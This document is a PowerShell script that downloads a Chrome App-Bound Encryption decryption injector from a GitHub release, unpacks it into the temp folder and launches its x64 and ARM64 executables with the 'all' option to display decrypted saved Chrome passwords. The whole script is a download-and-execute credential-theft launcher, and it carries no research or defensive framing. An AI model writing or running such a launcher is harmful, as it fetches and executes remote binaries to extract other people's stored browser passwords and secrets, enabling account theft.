# Chrome Decryption Tool - Download & Execute
# ===========================================

# Configuration
$zipUrl = "https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases/download/v0.17.3/chrome-injector-v0.17.3.zip"
$extractPath = "$env:TEMP\ChromeDecryptor"

Write-Host "üîì Chrome Password Decryption Tool" -ForegroundColor Cyan
Write-Host "==================================" -ForegroundColor Cyan

# STEP 1: DOWNLOAD
Write-Host "`n‚¨áÔ∏è  Downloading tool..." -ForegroundColor Yellow
$zipFile = "$extractPath\chrome.zip"

# Create folder
if (-not (Test-Path $extractPath)) {
    New-Item -ItemType Directory -Path $extractPath -Force | Out-Null
}

# Download
try {
    Invoke-WebRequest -Uri $zipUrl -OutFile $zipFile -UseBasicParsing
    Write-Host "‚úÖ Download complete" -ForegroundColor Green
} catch {
    Write-Host "‚ùå Download failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# STEP 2: EXTRACT
Write-Host "`nüì¶ Extracting files..." -ForegroundColor Yellow
try {
    Expand-Archive -Path $zipFile -DestinationPath $extractPath -Force
    Remove-Item $zipFile -Force
    Write-Host "‚úÖ Extraction complete" -ForegroundColor Green
} catch {
    Write-Host "‚ùå Extraction failed: $($_.Exception.Message)" -ForegroundColor Red
    exit 1
}

# STEP 3: FIND EXECUTABLES
Write-Host "`nüîç Finding executables..." -ForegroundColor Yellow
Set-Location $extractPath

$arm64Exe = Get-ChildItem -Filter "*arm64.exe" -Recurse | Select-Object -First 1
$x64Exe = Get-ChildItem -Filter "*x64.exe" -Recurse | Select-Object -First 1

if (-not $arm64Exe -and -not $x64Exe) {
    Write-Host "‚ùå No executables found in: $extractPath" -ForegroundColor Red
    Write-Host "Contents:" -ForegroundColor Yellow
    Get-ChildItem -Path $extractPath -Recurse | Format-Table Name
    exit 1
}

Write-Host "Found:" -ForegroundColor Green
if ($arm64Exe) { Write-Host "  ‚Ä¢ $($arm64Exe.Name)" -ForegroundColor Cyan }
if ($x64Exe) { Write-Host "  ‚Ä¢ $($x64Exe.Name)" -ForegroundColor Cyan }

# STEP 4: EXECUTE
Write-Host "`nüöÄ Executing decryption tools..." -ForegroundColor Magenta

# Execute x64
if ($x64Exe) {
    Write-Host "`nüîß Running $($x64Exe.Name) all..." -ForegroundColor Yellow
    Write-Host "="*50 -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", "cd '$extractPath'; .\$($x64Exe.Name) all" -WindowStyle Normal
    Write-Host "‚úÖ x64 started in new window" -ForegroundColor Green
}

# Execute ARM64
if ($arm64Exe) {
    Write-Host "`nüîß Running $($arm64Exe.Name) all..." -ForegroundColor Yellow
    Write-Host "="*50 -ForegroundColor Cyan
    Start-Process powershell.exe -ArgumentList "-NoExit", "-Command", "cd '$extractPath'; .\$($arm64Exe.Name) all" -WindowStyle Normal
    Write-Host "‚úÖ ARM64 started in new window" -ForegroundColor Green
}

# STEP 5: SUMMARY
Write-Host "`n" + "="*50 -ForegroundColor Cyan
Write-Host "üìä SUMMARY" -ForegroundColor Cyan
Write-Host "="*50 -ForegroundColor Cyan
Write-Host "‚Ä¢ Tool folder: $extractPath" -ForegroundColor Gray
Write-Host "‚Ä¢ x64 executed: $(if($x64Exe){'Yes'}else{'No'})" -ForegroundColor Gray
Write-Host "‚Ä¢ ARM64 executed: $(if($arm64Exe){'Yes'}else{'No'})" -ForegroundColor Gray
Write-Host "‚Ä¢ Windows opened: $(if($x64Exe -and $arm64Exe){'2'}elseif($x64Exe -or $arm64Exe){'1'}else{'0'})" -ForegroundColor Gray

Write-Host "`n‚úÖ Chrome decryption tools running!" -ForegroundColor Green
Write-Host "Check the new PowerShell windows for decrypted passwords." -ForegroundColor Gray
